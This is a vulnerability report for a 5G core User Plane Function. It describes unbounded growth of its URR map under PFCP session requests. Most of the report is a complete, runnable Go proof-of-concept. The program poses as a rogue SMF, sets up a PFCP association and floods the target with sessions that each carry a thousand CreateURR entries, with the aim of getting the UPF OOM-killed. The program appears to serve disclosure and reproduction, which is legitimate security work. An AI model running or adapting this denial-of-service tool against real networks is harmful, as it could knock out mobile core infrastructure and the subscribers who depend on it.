## Bug Decription
When the UPF receives a PFCP SessionEstablishmentRequest containing a large number of CreateURR IEs, it continuously allocates and stores URR state into an internal map (s.URRIDs) without any upper bound or resource control. As the attacker repeats this across many sessions and/or many URRs per session, the UPF memory usage grows rapidly until the container/host triggers the OOM killer and terminates the UPF process, resulting in a denial of service.

## To Reproduce
Steps to reproduce the behavior:
1. Start a new go project inside a new folder: go mod init poc and Create a main.go and paste the code below:
```
// Vuln-PC1-05: UPF Unbounded URR Map Growth (OOM DoS)
//
// Vulnerability: The UPF's Sess.CreateURR() function at node.go:334-367
// stores URR entries in s.URRIDs map without any limit check.
// URR ID is uint32, and each URRInfo struct is larger than other object types.
//
// Attack: Rogue SMF sends SessionEstablishmentRequest with many CreateURR IEs.
// URR is particularly effective for OOM due to larger struct size.

package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"sync/atomic"
	"time"

	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
)

var (
	upfAddr      = flag.String("upf", "127.0.0.1:8805", "UPF PFCP address")
	smfAddr      = flag.String("smf", "0.0.0.0:0", "SMF bind address (0 for auto)")
	nodeID       = flag.String("node-id", "192.168.56.101", "SMF Node ID (IP address)")
	sessionCount = flag.Int("sessions", 1000, "Number of sessions to create")
	urrsPerSess  = flag.Int("urrs", 1000, "URRs per session")
	rateLimit    = flag.Int("rate", 50, "Sessions per second")
	verbose      = flag.Bool("v", false, "Verbose output")
)

var sequenceNumber uint32 = 0

func getNextSeqNum() uint32 {
	return atomic.AddUint32(&sequenceNumber, 1)
}

func main() {
	flag.Parse()

	log.Printf("[*] Vuln-PC1-05: UPF Unbounded URR Map Growth (OOM DoS)")
	log.Printf("[*] Target: %s", *upfAddr)
	log.Printf("[*] Sessions: %d, URRs per session: %d", *sessionCount, *urrsPerSess)
	log.Printf("[*] Total URRs: %d", *sessionCount**urrsPerSess)

	// Calculate memory impact
	// Each URR in Go: URRInfo struct ~40 bytes + map entry ~48 bytes = ~88 bytes
	// Each URR in kernel: ~200-250 bytes (struct urr with VolumeMeasurement)
	goMem := *sessionCount * *urrsPerSess * 88
	kernelMem := *sessionCount * *urrsPerSess * 225
	log.Printf("[*] Estimated memory: ~%d MB (Go) + ~%d MB (kernel)",
		goMem/1024/1024, kernelMem/1024/1024)
	log.Printf("[!] URR is most memory-intensive object type!")

	// Resolve addresses
	laddr, err := net.ResolveUDPAddr("udp", *smfAddr)
	if err != nil {
		log.Fatalf("Failed to resolve local address: %v", err)
	}

	raddr, err := net.ResolveUDPAddr("udp", *upfAddr)
	if err != nil {
		log.Fatalf("Failed to resolve UPF address: %v", err)
	}

	conn, err := net.DialUDP("udp", laddr, raddr)
	if err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}
	defer conn.Close()

	log.Printf("[*] Local address: %s", conn.LocalAddr())

	// Step 1: Establish PFCP Association
	log.Printf("[*] Step 1: Establishing PFCP Association...")
	if err := establishAssociation(conn); err != nil {
		log.Fatalf("Failed to establish association: %v", err)
	}
	log.Printf("[+] PFCP Association established")

	// Step 2: Send sessions with many URRs
	log.Printf("[*] Step 2: Creating sessions with %d URRs each...", *urrsPerSess)
	log.Printf("[!] EXPLOIT: Each URR stored in unbounded s.URRIDs map with URRInfo struct")
	log.Printf("[!] Vulnerable code: node.go:347 - s.URRIDs[id] = &URRInfo{...}")

	startTime := time.Now()
	var interval time.Duration
	if *rateLimit > 0 {
		interval = time.Second / time.Duration(*rateLimit)
	}

	for i := 0; i < *sessionCount; i++ {
		seid := uint64(i + 1)

		if err := sendSessionWithURRs(conn, seid, *urrsPerSess); err != nil {
			log.Printf("[-] Session %d failed: %v", i+1, err)
			continue
		}

		if *verbose && (i+1)%100 == 0 {
			elapsed := time.Since(startTime).Seconds()
			log.Printf("[*] Progress: %d/%d sessions (%.1f/sec)", i+1, *sessionCount, float64(i+1)/elapsed)
		}

		if interval > 0 {
			time.Sleep(interval)
		}
	}

	elapsed := time.Since(startTime)
	log.Printf("[+] Attack completed: %d sessions with %d URRs each in %v",
		*sessionCount, *urrsPerSess, elapsed)
	log.Printf("[*] Monitor UPF process memory usage and check for OOM kill")
}

func establishAssociation(conn *net.UDPConn) error {
	req := message.NewAssociationSetupRequest(
		getNextSeqNum(),
		ie.NewNodeIDHeuristic(*nodeID),
		ie.NewRecoveryTimeStamp(time.Now()),
	)

	reqBytes := make([]byte, req.MarshalLen())
	if err := req.MarshalTo(reqBytes); err != nil {
		return fmt.Errorf("marshal error: %v", err)
	}

	if _, err := conn.Write(reqBytes); err != nil {
		return fmt.Errorf("write error: %v", err)
	}

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	buf := make([]byte, 65535)
	n, err := conn.Read(buf)
	if err != nil {
		return fmt.Errorf("read error: %v", err)
	}

	msg, err := message.Parse(buf[:n])
	if err != nil {
		return fmt.Errorf("parse error: %v", err)
	}

	if msg.MessageType() != message.MsgTypeAssociationSetupResponse {
		return fmt.Errorf("unexpected response: %s", msg.MessageTypeName())
	}

	return nil
}

func sendSessionWithURRs(conn *net.UDPConn, seid uint64, urrCount int) error {
	// Build CreateURR IEs
	var createURRs []*ie.IE

	for i := 0; i < urrCount; i++ {
		urrID := uint32(i + 1)

		// Create URR IE with measurement method
		// Each URR needs: URR ID, Measurement Method
		createURR := ie.NewCreateURR(
			ie.NewURRID(urrID),
			ie.NewMeasurementMethod(1, 1, 1), // Event, Volume, Duration
			ie.NewReportingTriggers(0x01),    // Periodic reporting
		)
		createURRs = append(createURRs, createURR)
	}

	// Build SessionEstablishmentRequest with all URRs
	ies := []*ie.IE{
		ie.NewNodeIDHeuristic(*nodeID),
		ie.NewFSEID(seid, net.ParseIP(*nodeID).To4(), nil),
		ie.NewPDNType(ie.PDNTypeIPv4),
	}
	ies = append(ies, createURRs...)

	req := message.NewSessionEstablishmentRequest(
		0, // MP
		0, // FO
		0, // SEID
		getNextSeqNum(),
		0, // Priority
		ies...,
	)

	reqBytes := make([]byte, req.MarshalLen())
	if err := req.MarshalTo(reqBytes); err != nil {
		return fmt.Errorf("marshal error: %v", err)
	}

	if _, err := conn.Write(reqBytes); err != nil {
		return fmt.Errorf("write error: %v", err)
	}

	return nil
}
```
